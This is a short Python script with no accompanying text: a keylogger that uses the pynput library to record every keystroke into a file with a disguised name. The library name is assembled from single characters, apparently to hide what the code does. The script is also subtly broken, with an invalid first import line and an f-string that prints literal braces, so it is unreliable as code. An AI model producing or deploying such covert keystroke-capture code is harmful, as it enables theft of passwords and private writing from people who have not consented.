import __import__('p'+'y'+'n'+'p'+'u'+'t')
def on_press(key):
    global log
    try:
        log += str(key.char)
    except AttributeError:
        if key == __import__('p'+'y'+'n'+'p'+'u'+'t').keyboard.Key.space:
            log += ' '
        elif key == __import__('p'+'y'+'n'+'p'+'u'+'t').keyboard.Key.enter:
            log += '\n'
        else:
            log += f'[{{key.name.upper()}}]'
def write_file(log):
    with open('k3yl0g5.t7xt', 'a') as file:
        file.write(log)
def on_release(key):
    global log
    if key == __import__('p'+'y'+'n'+'p'+'u'+'t').keyboard.Key.esc:
        return False
    write_file(log)
    log = ''
with open('k3yl0g5.t7xt', 'w'):
    pass
listener = __import__('p'+'y'+'n'+'p'+'u'+'t').keyboard.Listener(on_press=on_press, on_release=on_release)
listener.start()
listener.join()